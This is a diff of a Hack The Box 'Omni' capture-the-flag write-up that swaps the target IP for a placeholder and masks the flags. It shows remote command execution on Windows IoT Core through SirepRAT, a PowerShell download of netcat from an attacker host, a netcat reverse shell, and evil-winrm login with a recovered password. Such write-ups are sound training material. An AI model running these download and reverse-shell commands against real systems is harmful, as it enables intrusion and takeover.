@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Omni
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-omni-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
@@ -29,11 +27,11 @@ Short description to include any strange things to be dealt with
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.204`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni]
-└─$ sudo nmap -sSCV -p- -n -v -oA omni 10.10.10.204
+└─$ sudo nmap -sSCV -p- -n -v -oA omni <YOUR_IP>
 [sudo] password for zweilos: 
 \Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 19:15 EDT
 NSE: Loaded 151 scripts for scanning.
@@ -48,31 +46,31 @@ Completed NSE at 19:15, 0.00s elapsed
 Initiating NSE at 19:15
 Completed NSE at 19:15, 0.00s elapsed
 Initiating Ping Scan at 19:15
-Scanning 10.10.10.204 [4 ports]
+Scanning <YOUR_IP> [4 ports]
 Completed Ping Scan at 19:15, 0.09s elapsed (1 total hosts)
 Initiating SYN Stealth Scan at 19:15
-Scanning 10.10.10.204 [65535 ports]
-Discovered open port 8080/tcp on 10.10.10.204
-Discovered open port 135/tcp on 10.10.10.204
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 8080/tcp on <YOUR_IP>
+Discovered open port 135/tcp on <YOUR_IP>
 SYN Stealth Scan Timing: About 19.86% done; ETC: 19:18 (0:02:05 remaining)
-Discovered open port 29819/tcp on 10.10.10.204
+Discovered open port 29819/tcp on <YOUR_IP>
 SYN Stealth Scan Timing: About 45.73% done; ETC: 19:17 (0:01:12 remaining)
-Discovered open port 29817/tcp on 10.10.10.204
+Discovered open port 29817/tcp on <YOUR_IP>
 SYN Stealth Scan Timing: About 67.06% done; ETC: 19:17 (0:00:45 remaining)
-Discovered open port 29820/tcp on 10.10.10.204
-Discovered open port 5985/tcp on 10.10.10.204
+Discovered open port 29820/tcp on <YOUR_IP>
+Discovered open port 5985/tcp on <YOUR_IP>
 Completed SYN Stealth Scan at 19:17, 128.02s elapsed (65535 total ports)
 Initiating Service scan at 19:17
-Scanning 6 services on 10.10.10.204
+Scanning 6 services on <YOUR_IP>
 Completed Service scan at 19:18, 65.66s elapsed (6 services on 1 host)
-NSE: Script scanning 10.10.10.204.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 19:18
 Completed NSE at 19:18, 7.08s elapsed
 Initiating NSE at 19:18
 Completed NSE at 19:18, 0.23s elapsed
 Initiating NSE at 19:18
 Completed NSE at 19:18, 0.00s elapsed
-Nmap scan report for 10.10.10.204
+Nmap scan report for <YOUR_IP>
 Host is up (0.042s latency).
 Not shown: 65529 filtered ports
 PORT      STATE SERVICE  VERSION
@@ -135,11 +133,11 @@ Copyright (c) Microsoft Corporation. All rights reserved.
 https://aka.ms/powershell
 Type 'help' to get help.
 
-PS /home/zweilos/htb/omni> Enter-PSSession -ComputerName 10.10.10.204 -Credential 10.10.10.204\Administrator
+PS /home/zweilos/htb/omni> Enter-PSSession -ComputerName <YOUR_IP> -Credential <YOUR_IP>\Administrator
 
 PowerShell credential request
 Enter your credentials.                                              
-Password for user 10.10.10.204\Administrator: ********
+Password for user <YOUR_IP>\Administrator: ********
 Enter-PSSession: MI_RESULT_ACCESS_DENIED
 ```
 
@@ -149,7 +147,7 @@ denied again...I need to find the password to continue
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 --help                                                          2 ⨯
+└─$ python SirepRAT.py <YOUR_IP> --help                                                          2 ⨯
 usage: SirepRAT.py target_device_ip command_type [options]
 
 Exploit Windows IoT Core's Sirep service to execute remote commands on the device
@@ -185,7 +183,7 @@ remarks:
 Usage example: python SirepRAT.py 192.168.3.17 GetFileFromDevice --remote_path C:\Windows\System32\hostname.exe
 
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
+└─$ python SirepRAT.py <YOUR_IP> GetSystemInformationFromDevice
 <SystemInformationResult | type: 51, payload length: 32, kv: {'wProductType': 0, 'wServicePackMinor': 2, 'dwBuildNumber': 17763, 'dwOSVersionInfoSize': 0, 'dwMajorVersion': 10, 'wSuiteMask': 0, 'dwPlatformId': 2, 'wReserved': 0, 'wServicePackMajor': 1, 'dwMinorVersion': 0, 'szCSDVersion': 0}>
 ```
 
@@ -193,7 +191,7 @@ There aren't a lot of useful files that have known locations on a windows machin
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
+└─$ python SirepRAT.py <YOUR_IP> GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
 ---------
 # Copyright (c) 1993-2009 Microsoft Corp.
 #
@@ -226,7 +224,7 @@ Next I had to try running commands to see what privileges I actually had
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c set" --v                                                                  
+└─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c set" --v                                                                  
 ---------
 ALLUSERSPROFILE=C:\Data\ProgramData
 APPDATA=C:\Data\Users\System\AppData\Roaming
@@ -270,7 +268,7 @@ First I ran the `set` command, which returned a list of the local environment va
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c set" --v
+└─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c set" --v
 ---------
 AllUsersProfile=C:\Data\ProgramData
 APPDATA=C:\Data\Users\DefaultAccount\AppData\Roaming
@@ -314,7 +312,7 @@ Next I ran the same command to see if there was any difference in using the `--a
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " -c whoami /all" --v
+└─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " -c whoami /all" --v
 ---------
 Microsoft Windows [Version 10.0.17763.107]
 Copyright (c) Microsoft Corporation. All rights reserved.
@@ -329,11 +327,10 @@ My context seems to be running commands as System, so this should be a quick and
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe" --v 
+└─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe" --v 
 ---------
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
-
 
 ---------
 ---------
@@ -348,7 +345,7 @@ A little bit of testing shows that I can run PowerShell
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe wget http://10.10.15.105:8099/nc64.exe -Outfile nc64.exe" --v
+└─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe wget http://10.10.15.105:8099/nc64.exe -Outfile nc64.exe" --v
 ---------
 wget : The term 'wget' is not recognized as the name of a cmdlet, function, 
 script file, or operable program. Check the spelling of the name, or if a path 
@@ -360,7 +357,6 @@ At line:1 char:1
    dException
     + FullyQualifiedErrorId : CommandNotFoundException
 
-
 ---------
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 <OutputStreamResult | type: 11, payload length: 462, payload peek: 'wget : The term 'wget' is not recognized as the na'>
@@ -371,7 +367,7 @@ wget as an alias is not configured...this may be a limited version of PowerShell
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe Invoke-WebRequest http://10.10.15.105:8099/nc.exe -Outfile nc.exe" --v 
+└─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe Invoke-WebRequest http://10.10.15.105:8099/nc.exe -Outfile nc.exe" --v 
 ---------
 Invoke-WebRequest : Access to the path 'C:\windows\system32\nc.exe' is denied.
 At line:1 char:1
@@ -381,7 +377,6 @@ At line:1 char:1
    zedAccessException
     + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.Pow 
    erShell.Commands.InvokeWebRequestCommand
-
 
 ---------
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
@@ -393,21 +388,21 @@ so maybe I am not running as System as thought, since I was unable to write to t
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe mkdir C:\temp" --v                              
+└─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe mkdir C:\temp" --v                              
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 
 ┌──(zweilos㉿kali)-[~]
 └─$ python3 -m http.server 8099
 Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 
-10.10.10.204 - - [29/Oct/2020 19:25:22] "GET /nc.exe HTTP/1.1" 200 -
-10.10.10.204 - - [29/Oct/2020 19:26:35] "GET /nc.exe HTTP/1.1" 200 -
-10.10.10.204 - - [29/Oct/2020 19:27:25] "GET /nc.exe HTTP/1.1" 200 -
+<YOUR_IP> - - [29/Oct/2020 19:25:22] "GET /nc.exe HTTP/1.1" 200 -
+<YOUR_IP> - - [29/Oct/2020 19:26:35] "GET /nc.exe HTTP/1.1" 200 -
+<YOUR_IP> - - [29/Oct/2020 19:27:25] "GET /nc.exe HTTP/1.1" 200 -
 ^C
 Keyboard interrupt received, exiting.
 
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe Invoke-WebRequest http://10.10.15.105:8099/nc.exe -Outfile C:\temp\nc.exe" --v
+└─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe Invoke-WebRequest http://10.10.15.105:8099/nc.exe -Outfile C:\temp\nc.exe" --v
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 ```
 
@@ -415,7 +410,7 @@ Since I could not write to the current folder, I simply made a temp directory an
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe  C:\temp\nc64.exe 10.10.15.105 55541 -e Powershell.exe" --v
+└─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe  C:\temp\nc64.exe 10.10.15.105 55541 -e Powershell.exe" --v
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 ```
 
@@ -429,7 +424,7 @@ After uploading netcat to the `temp` folder I created I sent a reverse shell bac
 ┌──(zweilos㉿kali)-[~/htb/omni]
 └─$ nc -lvnp 55541        
 listening on [any] 55541 ...
-^[[Aconnect to [10.10.15.105] from (UNKNOWN) [10.10.10.204] 49711
+^[[Aconnect to [10.10.15.105] from (UNKNOWN) [<YOUR_IP>] 49711
 Windows PowerShell                                                                                      
 Copyright (C) Microsoft Corporation. All rights reserved.                                               
                    whoami' is not recognized as the name of a cmdlet,                                   
@@ -491,9 +486,7 @@ Since I couldn't use `whoami` I used `ls env:` to once again check the environme
 PS C:\Data\Users> ls
 ls
 
-
     Directory: C:\Data\Users
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
@@ -504,15 +497,12 @@ d-----         7/3/2020  11:22 PM                DevToolsUser
 d-r---        8/21/2020   1:55 PM                Public                        
 d-----       10/29/2020   8:35 PM                System                        
 
-
 PS C:\Data\Users> cd administrator
 cd administrator
 PS C:\Data\Users\administrator> ls
 ls
 
-
     Directory: C:\Data\Users\administrator
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
@@ -524,7 +514,6 @@ d-r---         7/3/2020  11:23 PM                Music
 d-r---         7/3/2020  11:23 PM                Pictures                      
 d-r---         7/3/2020  11:23 PM                Videos                        
 -ar---         7/4/2020   9:48 PM           1958 root.txt                      
-
 
 PS C:\Data\Users\administrator> type root.txt
 type root.txt
@@ -612,9 +601,7 @@ cd app
 PS C:\Data\Users\app> ls
 ls
 
-
     Directory: C:\Data\Users\app
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
@@ -628,7 +615,6 @@ d-r---         7/4/2020   7:28 PM                Videos
 -ar---         7/4/2020   8:20 PM            344 hardening.txt                 
 -ar---         7/4/2020   8:14 PM           1858 iot-admin.xml                 
 -ar---         7/4/2020   9:53 PM           1958 user.txt                      
-
 
 PS C:\Data\Users\app> type user.txt    
 type user.txt
@@ -664,9 +650,7 @@ At line:1 char:1
 PS C:\Data\Users\app> get-acl hardening.txt
 get-acl hardening.txt
 
-
     Directory: C:\Data\Users\app
-
 
 Path          Owner              Access                                        
 ----          -----              ------                                        
@@ -727,37 +711,29 @@ cd "C:\Program Files"
 PS C:\Program Files> ls
 ls
 
-
     Directory: C:\Program Files
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
 d-----       10/26/2018  11:37 PM                WindowsPowerShell             
-
 
 PS C:\Program Files> cd WindowsPowerShell
 cd WindowsPowerShell
 PS C:\Program Files\WindowsPowerShell> ls
 ls
 
-
     Directory: C:\Program Files\WindowsPowerShell
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
 d-----       10/26/2018  11:37 PM                Modules                       
-
 
 PS C:\Program Files\WindowsPowerShell> cd Modules
 cd Modules
 PS C:\Program Files\WindowsPowerShell\Modules> ls
 ls
 
-
     Directory: C:\Program Files\WindowsPowerShell\Modules
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
@@ -779,9 +755,7 @@ After searching for a long time and not finding anything I started searching the
 PS C:\Program files\WindowsPowerShell> ls -Recurse -Hidden
 ls -Recurse -Hidden
 
-
     Directory: C:\Program files\WindowsPowerShell\Modules\PackageManagement
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
@@ -837,7 +811,7 @@ hmm it seems like I cannot run commands as another user. I need to find a way to
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/omni]
-└─$ evil-winrm -i 10.10.10.204 -u app -p mesh5143                                
+└─$ evil-winrm -i <YOUR_IP> -u app -p mesh5143                                
 
 Evil-WinRM shell v2.3
 
@@ -890,7 +864,7 @@ Since I was running as `app` and could execute arbitrary commands I tried again 
 ```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\app\user.txt; $credential.GetNetworkCredential().Password }
 
-7cfd50f6bc34db3204898f1505ad9d70
+****
 ```
 
 I was able to successfully decrypt the flag!
@@ -934,8 +908,6 @@ At line:1 char:45
 
    ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
 
-
-
 You cannot call a method on a null-valued expression.
 
 At line:1 char:98
@@ -958,13 +930,9 @@ I still wasn't able to decode `iot-admin.xml` for some reason
 ```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\administrator\root.txt; $credential.GetNetworkCredential().Password }
 
-5dbdce5569e2c4708617c0ce6e9bf11d
+****
 ```
 
 I was able to get the root flag though!
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-omni-pwned.png)
-
-Thanks to [`egre55`](https://app.hackthebox.eu/users/1190) for... \[something interesting or useful about this machine.\]
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
